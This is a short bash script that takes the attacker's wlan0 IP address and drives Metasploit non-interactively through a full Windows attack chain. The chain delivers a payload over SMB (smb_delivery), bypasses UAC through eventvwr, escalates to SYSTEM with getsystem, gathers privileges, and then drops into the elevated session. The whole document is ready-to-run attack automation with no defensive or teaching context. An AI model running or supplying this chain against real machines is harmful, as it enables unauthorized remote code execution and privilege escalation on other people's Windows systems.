#!/bin/bash
ip=`ifconfig wlan0 | grep "inet " | awk '{print $2}'`
#echo $ip;exit
msfconsole -q -x "use exploit/windows/smb/smb_delivery; set share a;set file_name p.l;exploit;sleep 30;jobs -K;use exploit/windows/local/bypassuac_eventvwr;set session 1;exploit -z;jobs -K;sessions -k 1;sleep 5;use post/windows/escalate/getsystem;set session 2;exploit;use post/windows/gather/win_privs;set session 2;exploit;sessions -i 2"
